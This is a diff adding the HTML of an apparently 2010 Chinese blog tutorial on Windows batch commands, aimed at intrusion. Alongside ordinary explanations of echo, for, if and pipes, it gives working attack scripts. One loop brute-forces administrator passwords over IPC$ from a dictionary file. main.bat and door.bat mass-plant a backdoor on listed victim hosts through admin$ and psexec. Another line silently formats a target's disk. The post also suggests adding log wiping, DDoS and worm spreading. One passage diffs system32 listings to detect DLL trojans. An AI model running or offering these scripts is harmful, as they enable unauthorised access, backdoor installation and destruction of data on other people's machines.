@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>【批处理技巧】简单批处理、Bat 内部命令简介 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="简单批处理、Bat 内部命令简介，批处理技巧。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="简单批处理,Bat,内部命令简介,批处理技巧,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/797/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="【批处理技巧】简单批处理、Bat 内部命令简介" />
+<meta property="og:description" content="简单批处理、Bat 内部命令简介，批处理技巧。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/797/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2010-10-18T11:33:00&#43;08:00" />
+<meta property="article:modified_time" content="2010-10-18T11:33:00&#43;08:00" />
+
+<meta itemprop="name" content="【批处理技巧】简单批处理、Bat 内部命令简介">
+<meta itemprop="description" content="简单批处理、Bat 内部命令简介，批处理技巧。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2010-10-18T11:33:00&#43;08:00" />
+<meta itemprop="dateModified" content="2010-10-18T11:33:00&#43;08:00" />
+<meta itemprop="wordCount" content="11273">
+<meta itemprop="keywords" content="Bat,技巧,命令,批处理,Anonymous,app,Cmd,Dos,exe,FTP,Hack,IE,IP,IPS,MAC,Microsoft,NDS,Net,Rat,Unix,Windows,操作系统,程序,分析,服务,工具,后门,脚本,密码,木马,批量,入侵,软件,文件,系统,注册表," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="【批处理技巧】简单批处理、Bat 内部命令简介"/>
+<meta name="twitter:description" content="简单批处理、Bat 内部命令简介，批处理技巧。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">【批处理技巧】简单批处理、Bat 内部命令简介</h1>
+      
+      <div class="post-meta">
+        <time datetime="2010-10-18" class="post-time">
+          2010-10-18
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/bat/"> Bat </a>
+            <a href="https://lcx.cc/categories/%E6%8A%80%E5%B7%A7/"> 技巧 </a>
+            <a href="https://lcx.cc/categories/%E5%91%BD%E4%BB%A4/"> 命令 </a>
+            <a href="https://lcx.cc/categories/%E6%89%B9%E5%A4%84%E7%90%86/"> 批处理 </a>
+            
+          </div>
+        <span class="more-meta"> 约 11273 字 </span>
+          <span class="more-meta"> 预计阅读 23 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<P>一.简单批处理内部命令简介  <br />
+1.Echo 命令  <br />
+打开回显或关闭请求回显功能，或显示消息。如果没有任何参数，echo 命令将显示当前回显设置。  <br />
+语法  <br />
+echo [{on|off}] [message]  <br />
+Sample：@echo off / echo hello world  <br />
+在实际应用中我们会把这条命令和重定向符号（也称为管道符号，一般用&gt; &gt;&gt; ^）结合来实现输入一些命令到特定格式的文件中.这将在以后的例子中体现出来。 </P>
+<P>2.@ 命令  <br />
+表示不显示@后面的命令，在入侵过程中（例如使用批处理来格式化敌人的硬盘）自然不能让对方看到你使用的命令啦。  <br />
+Sample：@echo off  <br />
+@echo Now initializing the program,please wait a minite...  <br />
+@format X: /q/u/autoset (format 这个命令是不可以使用/y这个参数的，可喜的是微软留了个autoset这个参数给我们，效果和/y是一样的。) </P>
+<P>3.Goto 命令  <br />
+指定跳转到标签，找到标签后，程序将处理从下一行开始的命令。  <br />
+语法：goto label （label是参数，指定所要转向的批处理程序中的行。）  <br />
+Sample：  <br />
+if {%1}=={} goto noparms  <br />
+if {%2}=={} goto noparms（如果这里的if、%1、%2你不明白的话，先跳过去，后面会有详细的解释。）  <br />
+@Rem check parameters if null show usage  <br />
+:noparms  <br />
+echo Usage: monitor.bat ServerIP PortNumber  <br />
+goto end  <br />
+标签的名字可以随便起，但是最好是有意义的字母啦，字母前加个：用来表示这个字母是标签，goto命令就是根据这个：来寻找下一步跳到到那里。最好有一些说明这样你别人看起来才会理解你的意图啊。 </P>
+<P>4.Rem 命令  <br />
+注释命令，在C语言中相当与/*--------*/,它并不会被执行，只是起一个注释的作用，便于别人阅读和你自己日后修改。  <br />
+Rem Message  <br />
+Sample：@Rem Here is the description. </P>
+<P>5.Pause 命令  <br />
+运行 Pause 命令时，将显示下面的消息：  <br />
+Press any key to continue . . .  <br />
+Sample：  <br />
+@echo off  <br />
+:begin  <br />
+copy a:*.* d：back  <br />
+echo Please put a new disk into driver A  <br />
+pause  <br />
+goto begin  <br />
+在这个例子中，驱动器 A 中磁盘上的所有文件均复制到d:back中。显示的注释提示您将另一张磁盘放入驱动器 A 时，pause 命令会使程序挂起，以便您更换磁盘，然后按任意键继续处理。 </P>
+<P>6.Call 命令  <br />
+从一个批处理程序调用另一个批处理程序，并且不终止父批处理程序。call 命令接受用作调用目标的标签。如果在脚本或批处理文件外使用 Call，它将不会在命令行起作用。  <br />
+语法  <br />
+call [Drive:][Path] FileName [BatchParameters] [:label [arguments]  <br />
+参数  <br />
+[Drive:}[Path] FileName  <br />
+指定要调用的批处理程序的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。 </P>
+<P>7.start 命令  <br />
+调用外部程序，所有的DOS命令和命令行程序都可以由start命令来调用。  <br />
+入侵常用参数：  <br />
+MIN 开始时窗口最小化  <br />
+SEPARATE 在分开的空间内开始 16 位 Windows 程序  <br />
+HIGH 在 HIGH 优先级类别开始应用程序  <br />
+REALTIME 在 REALTIME 优先级类别开始应用程序  <br />
+WAIT 启动应用程序并等候它结束  <br />
+parameters 这些为传送到命令/程序的参数  <br />
+执行的应用程序是 32-位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。  <br />
+8.choice 命令  <br />
+choice 使用此命令可以让用户输入一个字符，从而运行不同的命令。使用时应该加/c:参数，c:后应写提示可输入的字符，之间无空格。它的返回码为1234……  <br />
+如: choice /c:dme defrag,mem,end  <br />
+将显示  <br />
+defrag,mem,end[D,M,E]?  <br />
+Sample：  <br />
+Sample.bat的内容如下:  <br />
+@echo off  <br />
+choice /c:dme defrag,mem,end  <br />
+if errorlevel 3 goto defrag （应先判断数值最高的错误码）  <br />
+if errorlevel 2 goto mem  <br />
+if errotlevel 1 goto end </P>
+<P>:defrag  <br />
+c:dosdefrag  <br />
+goto end  <br />
+:mem  <br />
+mem  <br />
+goto end  <br />
+:end  <br />
+echo good bye </P>
+<P>此文件运行后，将显示 defrag,mem,end[D,M,E]? 用户可选择d m e ，然后if语句将作出判断，d表示执行标号为defrag的程序段，m表示执行标号为mem的程序段，e表示执行标号为end的程序段，每个程序段最后都以goto end将程序跳到end标号处，然后程序将显示good bye，文件结束。 </P>
+<P>9.If 命令 </P>
+<P>if 表示将判断是否符合规定的条件，从而决定执行不同的命令。 有三种格式:  <br />
+1、if "参数" == "字符串" 　待执行的命令  <br />
+参数如果等于指定的字符串，则条件成立，运行命令，否则运行下一句。(注意是两个等号）  <br />
+如if "%1"=="a" format a:  <br />
+if {%1}=={} goto noparms  <br />
+if {%2}=={} goto noparms </P>
+<P>2、if exist 文件名　 待执行的命令  <br />
+如果有指定的文件，则条件成立，运行命令，否则运行下一句。  <br />
+如if exist config.sys edit config.sys </P>
+<P>3、if errorlevel / if not errorlevel 数字　 待执行的命令  <br />
+如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句。  <br />
+如if errorlevel 2 goto x2 　  <br />
+DOS程序运行时都会返回一个数字给DOS，称为错误码errorlevel或称返回码，常见的返回码为0、1。 </P>
+<P>10.for 命令  <br />
+for 命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。  <br />
+在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable </P>
+<P>for {%variable|%%variable} in (set) do command [ CommandLineOptions]  <br />
+%variable 指定一个单一字母可替换的参数。  <br />
+(set) 指定一个或一组文件。可以使用通配符。  <br />
+command 指定对每个文件执行的命令。  <br />
+command-parameters 为特定命令指定参数或命令行开关。  <br />
+在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable  <br />
+而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I </P>
+<P>如果命令扩展名被启用，下列额外的 FOR 命令格式会受到  <br />
+支持: </P>
+<P>FOR /D %variable IN (set) DO command [command-parameters] </P>
+<P>如果集中包含通配符，则指定与目录名匹配，而不与文件  <br />
+名匹配。 </P>
+<P>FOR /R [drive:]path] %variable IN (set) DO command [command- </P>
+<P>检查以 [drive:]path 为根的目录树，指向每个目录中的  <br />
+FOR 语句。如果在 /R 后没有指定目录，则使用当前  <br />
+目录。如果集仅为一个单点(.)字符，则枚举该目录树。 </P>
+<P>FOR /L %variable IN (start,step,end) DO command [command-para </P>
+<P>该集表示以增量形式从开始到结束的一个数字序列。  <br />
+因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生  <br />
+序列 (5 4 3 2 1)。 </P>
+<P>FOR /F ["options"] %variable IN (file-set) DO command  <br />
+FOR /F ["options"] %variable IN ("string") DO command  <br />
+FOR /F ["options"] %variable IN ('command') DO command </P>
+<P>或者，如果有 usebackq 选项: </P>
+<P>FOR /F ["options"] %variable IN (file-set) DO command  <br />
+FOR /F ["options"] %variable IN ("string") DO command  <br />
+FOR /F ["options"] %variable IN ('command') DO command </P>
+<P>filenameset 为一个或多个文件名。继续到 filenameset 中的  <br />
+下一个文件之前，每份文件都已被打开、读取并经过处理。  <br />
+处理包括读取文件，将其分成一行行的文字，然后将每行  <br />
+解析成零或更多的符号。然后用已找到的符号字符串变量值  <br />
+调用 For 循环。以默认方式，/F 通过每个文件的每一行中分开  <br />
+的第一个空白符号。跳过空白行。您可通过指定可选 "options"  <br />
+参数替代默认解析操作。这个带引号的字符串包括一个或多个  <br />
+指定不同解析选项的关键字。这些关键字为: </P>
+<P>eol=c - 指一个行注释字符的结尾(就一个)  <br />
+skip=n - 指在文件开始时忽略的行数。  <br />
+delims=xxx - 指分隔符集。这个替换了空格和跳格键的  <br />
+默认分隔符集。  <br />
+tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代  <br />
+的 for 本身。这会导致额外变量名称的  <br />
+格式为一个范围。通过 nth 符号指定 m  <br />
+符号字符串中的最后一个字符星号，  <br />
+那么额外的变量将在最后一个符号解析之  <br />
+分配并接受行的保留文本。  <br />
+usebackq - 指定新语法已在下类情况中使用:  <br />
+在作为命令执行一个后引号的字符串并且  <br />
+引号字符为文字字符串命令并允许在 fi  <br />
+中使用双引号扩起文件名称。 </P>
+<P>sample1:  <br />
+FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do command </P>
+<P>会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将  <br />
+每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或  <br />
+空格定界符号。请注意，这个 for 程序体的语句引用 %i 来  <br />
+取得第二个符号，引用 %j 来取得第三个符号，引用 %k  <br />
+来取得第三个符号后的所有剩余符号。对于带有空格的文件  <br />
+名，您需要用双引号将文件名括起来。为了用这种方式来使  <br />
+用双引号，您还需要使用 usebackq 选项，否则，双引号会  <br />
+被理解成是用作定义某个要分析的字符串的。 </P>
+<P>%i 专门在 for 语句中得到说明，%j 和 %k 是通过  <br />
+tokens= 选项专门得到说明的。您可以通过 tokens= 一行  <br />
+指定最多 26 个符号，只要不试图说明一个高于字母 'z' 或  <br />
+'Z' 的变量。请记住，FOR 变量是单一字母、分大小写和全局的；  <br />
+同时不能有 52 个以上都在使用中。 </P>
+<P>您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，  <br />
+用单引号将括号之间的 filenameset 括起来。这样，该字符  <br />
+串会被当作一个文件中的一个单一输入行。 </P>
+<P>最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将  <br />
+括号之间的 filenameset 变成一个反括字符串。该字符串会  <br />
+被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进  <br />
+内存，并被当作文件分析。因此，以下例子: </P>
+<P>FOR /F "usebackq delims==" %i IN (`set`) DO @echo %i </P>
+<P>会枚举当前环境中的环境变量名称。 </P>
+<P>另外，FOR 变量参照的替换已被增强。您现在可以使用下列  <br />
+选项语法: </P>
+<P>~I - 删除任何引号(")，扩充 %I  <br />
+%~fI - 将 %I 扩充到一个完全合格的路径名  <br />
+%~dI - 仅将 %I 扩充到一个驱动器号  <br />
+%~pI - 仅将 %I 扩充到一个路径  <br />
+%~nI - 仅将 %I 扩充到一个文件名  <br />
+%~xI - 仅将 %I 扩充到一个文件扩展名  <br />
+%~sI - 扩充的路径只含有短名  <br />
+%~aI - 将 %I 扩充到文件的文件属性  <br />
+%~tI - 将 %I 扩充到文件的日期/时间  <br />
+%~zI - 将 %I 扩充到文件的大小  <br />
+%~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩充  <br />
+到找到的第一个完全合格的名称。如果环境变量  <br />
+未被定义，或者没有找到文件，此组合键会扩充  <br />
+空字符串 </P>
+<P>可以组合修饰符来得到多重结果: </P>
+<P>%~dpI - 仅将 %I 扩充到一个驱动器号和路径  <br />
+%~nxI - 仅将 %I 扩充到一个文件名和扩展名  <br />
+%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名  <br />
+%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充  <br />
+到找到的第一个驱动器号和路径。  <br />
+%~ftzaI - 将 %I 扩充到类似输出线路的 DIR </P>
+<P>在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法  <br />
+用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名  <br />
+比较易读，而且避免与不分大小写的组合键混淆。 </P>
+<P>以上是MS的官方帮助，下面我们举几个例子来具体说明一下For命令在入侵中的用途。 </P>
+<P>sample2： </P>
+<P>利用For命令来实现对一台目标Win2k主机的暴力密码破解。  <br />
+我们用net use \ipipc$ "password" /u:"administrator"来尝试这和目标主机进行连接，当成功时记下密码。  <br />
+最主要的命令是一条：for /f i% in (dict.txt) do net use \ipipc$ "i%" /u:"administrator"  <br />
+用i%来表示admin的密码，在dict.txt中这个取i%的值用net use 命令来连接。然后将程序运行结果传递给find命令－－  <br />
+for /f i%% in (dict.txt) do net use \ipipc$ "i%%" /u:"administrator"|find ":命令成功完成"&gt;&gt;D:ok.txt ，这样就ko了。 </P>
+<P>sample3： </P>
+<P>你有没有过手里有大量肉鸡等着你去种后门＋木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用批处理文件，可以简化日常或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。 </P>
+<P>主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）  <br />
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call door.bat %%i %%j %%k  <br />
+tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。  <br />
+而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马＋后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的文件。  <br />
+delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。  <br />
+代码雏形：  <br />
+--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------  <br />
+@echo off  <br />
+@if "%1"=="" goto usage  <br />
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k  <br />
+@goto end  <br />
+:usage  <br />
+@echo run this batch in dos modle.or just double-click it.  <br />
+:end  <br />
+--------------- cut here then save as a batchfile(I call it main.bat ) --------------------------- </P>
+<P> <br />
+------------------- cut here then save as a batchfile(I call it door.bat) -----------------------------  <br />
+@net use \%1ipc$ %3 /u:"%2"  <br />
+@if errorlevel 1 goto failed  <br />
+@echo Trying to establish the IPC$ connection …………OK  <br />
+@copy windrv32.exe\%1admin$system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PWD %3 &gt;&gt;ko.txt  <br />
+@psexec \%1 c:winntsystem32windrv32.exe  <br />
+@psexec \%1 net start windrv32 &amp;&amp; if not errorlevel 1 echo %1 Backdoored &gt;&gt;ko.txt  <br />
+:failed  <br />
+@echo Sorry can not connected to the victim.  <br />
+----------------- cut here then save as a batchfile(I call it door.bat) --------------------------------  <br />
+这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（Windrv32.exe）,PSexec.exe需放在统一目录下.批处理内容  <br />
+尚可扩展,例如:加入清除日志+DDOS的功能,加入定时添加用户的功能,更深入一点可以使之具备自动传播功能(蠕虫).此处不多做叙述,有兴趣的朋友可自行研究. </P>
+<P>二.如何在批处理文件中使用参数  <br />
+批处理中可以使用参数，一般从1%到 9%这九个，当有多个参数时需要用shift来移动，这种情况并不多见，我们就不考虑它了。  <br />
+sample1：fomat.bat  <br />
+@echo off  <br />
+if "%1"=="a" format a:  <br />
+:format  <br />
+@format a:/q/u/auotset  <br />
+@echo please insert another disk to driver A.  <br />
+@pause  <br />
+@goto fomat  <br />
+这个例子用于连续地格式化几张软盘，所以用的时候需在dos窗口输入fomat.bat a，呵呵,好像有点画蛇添足了～^_^  <br />
+sample2：  <br />
+当我们要建立一个IPC$连接地时候总要输入一大串命令，弄不好就打错了，所以我们不如把一些固定命令写入一个批处理，把肉鸡地ip password username 当着参数来赋给这个批处理，这样就不用每次都打命令了。  <br />
+@echo off  <br />
+@net use \1%ipc$ "2%" /u:"3%" 注意哦，这里PASSWORD是第二个参数。  <br />
+@if errorlevel 1 echo connection failed  <br />
+怎么样,使用参数还是比较简单的吧？你这么帅一定学会了^_^. </P>
+<P>三.如何使用组合命令(Compound Command) </P>
+<P>1.&amp; </P>
+<P>Usage：第一条命令 &amp; 第二条命令 [&amp; 第三条命令...] </P>
+<P>用这种方法可以同时执行多条命令，而不管命令是否执行成功 </P>
+<P>Sample：  <br />
+C:&gt;dir z: &amp; dir c:Ex4rch  <br />
+The system cannot find the path specified.  <br />
+Volume in drive C has no label.  <br />
+Volume Serial Number is 0078-59FB </P>
+<P>Directory of c:Ex4rch </P>
+<P>2002-05-14 23:51 &lt;DIR&gt; .  <br />
+2002-05-14 23:51 &lt;DIR&gt; ..  <br />
+2002-05-14 23:51 14 sometips.gif </P>
+<P>2.&amp;&amp; </P>
+<P>Usage：第一条命令 &amp;&amp; 第二条命令 [&amp;&amp; 第三条命令...] </P>
+<P>用这种方法可以同时执行多条命令，当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令； </P>
+<P>Sample：  <br />
+C:&gt;dir z: &amp;&amp; dir c:Ex4rch  <br />
+The system cannot find the path specified. </P>
+<P>C:&gt;dir c:Ex4rch &amp;&amp; dir z:  <br />
+Volume in drive C has no label.  <br />
+Volume Serial Number is 0078-59FB </P>
+<P>Directory of c:Ex4rch </P>
+<P>2002-05-14 23:55 &lt;DIR&gt; .  <br />
+2002-05-14 23:55 &lt;DIR&gt; ..  <br />
+2002-05-14 23:55 14 sometips.gif  <br />
+1 File(s) 14 bytes  <br />
+2 Dir(s) 768,671,744 bytes free  <br />
+The system cannot find the path specified. </P>
+<P>在做备份的时候可能会用到这种命令会比较简单，如：  <br />
+dir <A href="file://192.168.0.1/database/backup.mdb">file://192.168.0.1/database/backup.mdb</A> &amp;&amp; copy <A href="file://192.168.0.1/database/backup.mdb">file://192.168.0.1/database/backup.mdb</A> E:backup  <br />
+如果远程服务器上存在backup.mdb文件，就执行copy命令，若不存在该文件则不执行copy命令。这种用法可以替换IF exist了 ：） </P>
+<P>3.|| </P>
+<P>Usage：第一条命令 || 第二条命令 [|| 第三条命令...] </P>
+<P>用这种方法可以同时执行多条命令，当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令； </P>
+<P>Sample：  <br />
+C:Ex4rch&gt;dir sometips.gif || del sometips.gif  <br />
+Volume in drive C has no label.  <br />
+Volume Serial Number is 0078-59FB </P>
+<P>Directory of C:Ex4rch </P>
+<P>2002-05-14 23:55 14 sometips.gif  <br />
+1 File(s) 14 bytes  <br />
+0 Dir(s) 768,696,320 bytes free </P>
+<P>组合命令使用的例子：  <br />
+sample：  <br />
+@copy trojan.exe \%1admin$system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PASS %3 &gt;&gt;victim.txt </P>
+<P>四、管道命令的使用 </P>
+<P>1.| 命令  <br />
+Usage：第一条命令 | 第二条命令 [| 第三条命令...]  <br />
+将第一条命令的结果作为第二条命令的参数来使用，记得在unix中这种方式很常见。 </P>
+<P>sample：  <br />
+time /t&gt;&gt;D:IP.log  <br />
+netstat -n -p tcp|find ":3389"&gt;&gt;D:IP.log  <br />
+start Explorer  <br />
+看出来了么？用于终端服务允许我们为用户自定义起始的程序，来实现让用户运行下面这个bat，以获得登录用户的IP。 </P>
+<P>2.&gt;、&gt;&gt;输出重定向命令  <br />
+将一条命令或某个程序输出结果的重定向到特定文件中, &gt; 与 &gt;&gt;的区别在于，&gt;会清除调原有文件中的内容后写入指定文件，而&gt;&gt;只会追加内容到指定文件中，而不会改动其中的内容。 </P>
+<P>sample1：  <br />
+echo hello world&gt;c:hello.txt (stupid example?) </P>
+<P>sample2:  <br />
+时下DLL木马盛行，我们知道system32是个捉迷藏的好地方，许多木马都削尖了脑袋往那里钻，DLL马也不例外，针对这一点我们可以在安装好系统和必要的应用程序后，对该目录下的EXE和DLL文件作一个记录：  <br />
+运行CMD--转换目录到system32--dir *.exe&gt;exeback.txt &amp; dir *.dll&gt;dllback.txt,  <br />
+这样所有的EXE和DLL文件的名称都被分别记录到exeback.txt和dllback.txt中,  <br />
+日后如发现异常但用传统的方法查不出问题时,则要考虑是不是系统中已经潜入DLL木马了.  <br />
+这时我们用同样的命令将system32下的EXE和DLL文件记录到另外的exeback1.txt和dllback1.txt中,然后运行:  <br />
+CMD--fc exeback.txt exeback1.txt&gt;diff.txt &amp; fc dllback.txt dllback1.txt&gt;diff.txt.(用FC命令比较前后两次的DLL和EXE文件,并将结果输入到diff.txt中),这样我们就能发现一些多出来的DLL和EXE文件,然后通过查看创建时间、版本、是否经过压缩等就能够比较容易地判断出是不是已经被DLL木马光顾了。没有是最好，如果有的话也不要直接DEL掉，先用regsvr32 /u trojan.dll将后门DLL文件注销掉,再把它移到回收站里，若系统没有异常反映再将之彻底删除或者提交给杀毒软件公司。 </P>
+<P>3.&lt; 、&gt;&amp; 、&lt;&amp;  <br />
+&lt; 从文件中而不是从键盘中读入命令输入。  <br />
+&gt;&amp; 将一个句柄的输出写入到另一个句柄的输入中。  <br />
+&lt;&amp; 从一个句柄读取输入并将其写入到另一个句柄输出中。  <br />
+这些并不常用，也就不多做介绍。 </P>
+<P>五.如何用批处理文件来操作注册表 </P>
+<P>在入侵过程中经常回操作注册表的特定的键值来实现一定的目的，例如:为了达到隐藏后门、木马程序而删除Run下残余的键值。或者创建一个服务用以加载后门。当然我们也会修改注册表来加固系统或者改变系统的某个属性，这些都需要我们对注册表操作有一定的了解。下面我们就先学习一下如何使用.REG文件来操作注册表.(我们可以用批处理来生成一个REG文件)  <br />
